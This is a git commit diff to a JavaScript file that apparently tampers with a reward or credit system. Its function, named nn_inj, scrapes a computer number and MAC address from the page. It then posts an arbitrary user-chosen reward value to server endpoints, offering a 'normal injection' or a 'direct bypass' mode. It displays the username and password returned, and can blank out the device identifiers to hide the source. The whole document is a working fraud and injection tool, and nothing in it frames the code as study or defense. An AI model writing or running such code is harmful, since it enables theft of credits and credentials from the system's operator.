463ac085b800409b47cbcbbad6400e5c86689f84
ZahNarztiK <ZahNarztiK@WindowsLive.com>
2017-07-24 20:14:18 +0700

    Ver 2
    - +UX
    - Nean protocol

--- nngg.js
+++ nngg.js
@@ -4,10 +4,23 @@ function nn_inj(){
 		mn=/txtMacAddress = ['"](.*)['"];/i.exec(ht)[1];
 	var rw=prompt(`### Start Gonging ###\nComNo: ${cn=(cn?cn:"N/A")}\nMacAddress: ${mn=(mn?mn:"N/A")}`);
 	if(rw&&!isNaN(rw)){
-		rs=confirm(`### Consealed Protocol ###\nComNo: ${cn}\nMacAddress: ${mn}\n\nDo you want to conseal them?\n(OK: Mask with ' ', Cancel: Leave it)`);
-		$.post('RunSearchReward.php',{RewardValue:Number(rw).toFixed(2),ComNo:(rs?' ':cn),MacAddress:(rs?' ':mn)},data=>{
-			var spl=/: (.*) <br>Password: (.*)</i.exec(data);
-			alert(spl?`${spl[1]}\n${spl[2]}`:data);
-		});
+		rw=Number(rw).toFixed(2);
+		rs=confirm(`### Nean? ###\nOK: Normal injection\nCancel: Direct bypass`);
+		if(rs)
+			$.post('RunCheckReward.php',{AllValue:`${rw},${rw},${rw}`,Credit:$('#HideCredit').val()},data=>{
+				var sd=$.trim(data).split("|");
+				$('#ShowReward').show().html(sd[0]);
+				$('#ShowCredit').show().html(sd[1]);
+				$('#HideCredit').val(sd[1]);
+				if(sd[2]){
+					$('#ShowBtn').show();
+					$('#ClickReward').val(sd[2]);
+				}
+			})
+		else
+			$.post('RunSearchReward.php',{RewardValue:rw,ComNo:cn,MacAddress:mn},data=>{
+				var spl=/: (.*) <br>Password: (.*)</i.exec(data);
+				alert(spl?`${spl[1]}\n${spl[2]}`:data);
+			});
 	}
 }
